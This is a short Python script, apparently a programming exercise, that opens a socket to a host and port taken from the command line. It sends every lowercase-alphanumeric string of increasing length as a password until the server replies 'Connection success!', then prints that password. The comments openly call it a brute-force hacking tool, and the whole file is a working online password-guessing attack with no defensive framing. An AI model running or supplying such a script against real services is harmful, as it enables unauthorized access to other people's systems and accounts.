import sys
import socket
import itertools

# creating a brute force hacking generator
def passwrd(rep):
    brute_force_str = "abcdefghijklmnopqrstuvwxyz0123456789"
    pswrds = itertools.product(brute_force_str, repeat=rep)
    for pswr in pswrds:
        data = "".join(pswr)
        yield data

# connecting to the server and trying to brute force the password
with socket.socket() as client_socket:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    client_socket.connect(address)

    rep = 1
    flag = True
    while flag:
        data = passwrd(rep)
        for p in data:
            bp = p.encode()
            client_socket.send(bp)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == "Connection success!":
                print(p)
                flag = False
        rep += 1